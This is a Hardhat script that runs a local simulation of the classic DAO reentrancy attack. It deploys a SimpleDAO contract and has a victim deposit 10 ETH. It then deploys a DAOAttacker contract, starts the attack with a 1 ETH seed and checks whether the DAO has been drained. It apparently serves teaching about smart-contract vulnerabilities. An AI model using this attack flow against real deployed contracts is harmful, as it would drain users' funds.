import hre from "hardhat";
import { formatEther, parseEther } from "ethers";

async function main() {
    console.log("=== DAO Hack Simulation (Reentrancy) ===");
    console.log("Strictly for local educational purposes only.\n");

    const [deployer, victim, attacker] = await hre.ethers.getSigners();

    // 1. Deploy DAO
    const SimpleDAO = await hre.ethers.getContractFactory("SimpleDAO");
    const dao = await SimpleDAO.connect(deployer).deploy();
    await dao.waitForDeployment();
    const daoAddress = await dao.getAddress();
    console.log(`SimpleDAO deployed to: ${daoAddress}`);

    // 2. Victim deposits 10 ETH
    console.log("Victim depositing 10 ETH into DAO...");
    await dao.connect(victim).deposit({ value: parseEther("10.0") });

    let daoBalance = await hre.ethers.provider.getBalance(daoAddress);
    console.log(`DAO Balance before attack: ${formatEther(daoBalance)} ETH`);

    // 3. Deploy Attacker Contract
    const DAOAttacker = await hre.ethers.getContractFactory("DAOAttacker");
    const attackerContract = await DAOAttacker.connect(attacker).deploy(daoAddress);
    await attackerContract.waitForDeployment();
    const attackerAddress = await attackerContract.getAddress();

    // 4. Attack with 1 ETH seed
    console.log("\nAttacker initiating attack with 1 ETH seed...");
    await attackerContract.connect(attacker).attack({ value: parseEther("1.0") });

    // 5. Verify results
    daoBalance = await hre.ethers.provider.getBalance(daoAddress);
    const attackerBalance = await hre.ethers.provider.getBalance(attackerAddress);

    console.log(`\nDAO Balance after attack: ${formatEther(daoBalance)} ETH`);
    console.log(`Attacker Contract Balance after attack: ${formatEther(attackerBalance)} ETH`);

    if (daoBalance === 0n && attackerBalance === parseEther("11.0")) {
        console.log("SUCCESS: DAO was drained successfully.");
    } else {
        console.log("FAILED: Exploit did not work as expected.");
    }
}

main().catch(console.error);
